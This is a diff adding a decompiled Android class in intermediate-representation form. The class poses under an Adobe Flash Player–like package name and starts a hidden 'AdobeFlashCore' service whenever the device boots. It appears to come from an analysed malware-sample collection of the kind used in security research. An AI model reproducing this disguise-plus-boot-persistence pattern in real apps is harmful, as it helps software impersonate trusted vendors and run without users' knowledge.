@@ -1,0 +1,25 @@
+record `com.adobe.flashplayer_.SystemSWF` @kind class @AccessFlag PUBLIC extends `android.content.BroadcastReceiver` @kind class {
+}
+procedure `void` `<init>`(`com.adobe.flashplayer_.SystemSWF` v0 @kind this) @signature `Lcom/adobe/flashplayer_/SystemSWF;.<init>:()V` @AccessFlag PUBLIC_CONSTRUCTOR {
+    temp;
+
+  #L037a70.  call `<init>`(v0) @signature `Landroid/content/BroadcastReceiver;.<init>:()V` @kind direct;
+  #L037a76.  return @kind void;
+}
+procedure `void` `onReceive`(`com.adobe.flashplayer_.SystemSWF` v2 @kind this, `android.content.Context` v3 @kind object @name `context`, `android.content.Intent` v4 @kind object @name `intent`) @signature `Lcom/adobe/flashplayer_/SystemSWF;.onReceive:(Landroid/content/Context;Landroid/content/Intent;)V` @AccessFlag PUBLIC {
+    temp;
+    v0;
+    v1;
+
+  #L037a88.  v0:= "android.intent.action.BOOT_COMPLETED" @kind object;
+  #L037a8c.  call temp:= `getAction`(v4) @signature `Landroid/content/Intent;.getAction:()Ljava/lang/String;` @kind virtual;
+  #L037a92.  v1:= temp @kind object;
+  #L037a94.  call temp:= `equals`(v0, v1) @signature `Ljava/lang/String;.equals:(Ljava/lang/Object;)Z` @kind virtual;
+  #L037a9a.  v0:= temp;
+  #L037a9c.  if v0 == 0 then goto L037ab4;
+  #L037aa0.  v0:= new `android.content.Intent`;
+  #L037aa4.  v1:= constclass @type ^`com.adobe.flashplayer_.AdobeFlashCore` @kind object;
+  #L037aa8.  call `<init>`(v0, v3, v1) @signature `Landroid/content/Intent;.<init>:(Landroid/content/Context;Ljava/lang/Class;)V` @kind direct;
+  #L037aae.  call temp:= `startService`(v3, v0) @signature `Landroid/content/Context;.startService:(Landroid/content/Intent;)Landroid/content/ComponentName;` @kind virtual;
+  #L037ab4.  return @kind void;
+}
